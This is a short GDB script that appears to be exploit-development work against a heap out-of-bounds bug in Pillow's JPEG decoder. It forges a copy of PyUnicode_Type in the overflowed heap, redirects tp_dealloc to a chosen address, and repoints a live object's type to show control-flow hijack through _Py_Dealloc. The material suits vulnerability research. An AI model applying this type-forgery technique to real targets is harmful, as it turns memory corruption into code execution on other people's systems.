set breakpoint pending on
break ImagingJpegDecode
run
set $b=(unsigned char*)state->buffer
dump binary memory /tmp/pw2-w4/heap_orig.bin $b+128 $b+1024
printf "SAVED type=%lx\n",*(unsigned long*)($b+184)
finish
printf "AFTER_DECODE type=%lx\n",*(unsigned long*)($b+184)
restore /tmp/pw2-w4/heap_orig.bin binary $b+128
# copy the real PyUnicode_Type (416 bytes) into OOB-controlled heap at $b+512
dump binary memory /tmp/pw2-w4/realtype.bin (char*)&PyUnicode_Type (char*)&PyUnicode_Type+416
restore /tmp/pw2-w4/realtype.bin binary $b+512
# forge tp_dealloc (offset 48) to a known static marker: _PyObject_Dump = 0x45e6e6
set *(unsigned long*)($b+512+48)=0x45e6e6
# point the live object's ob_type at the forged type
set *(unsigned long*)($b+184)=$b+512
printf "FORGED faketype=%lx tp_dealloc=%lx objtype=%lx\n",$b+512,*(unsigned long*)($b+512+48),*(unsigned long*)($b+184)
break *0x45e6e6
printf "CALLING _Py_Dealloc\n"
call (void)_Py_Dealloc((void*)($b+176))
printf "AFTER_CALL pc=%p\n",$pc
info registers rdi
bt 4
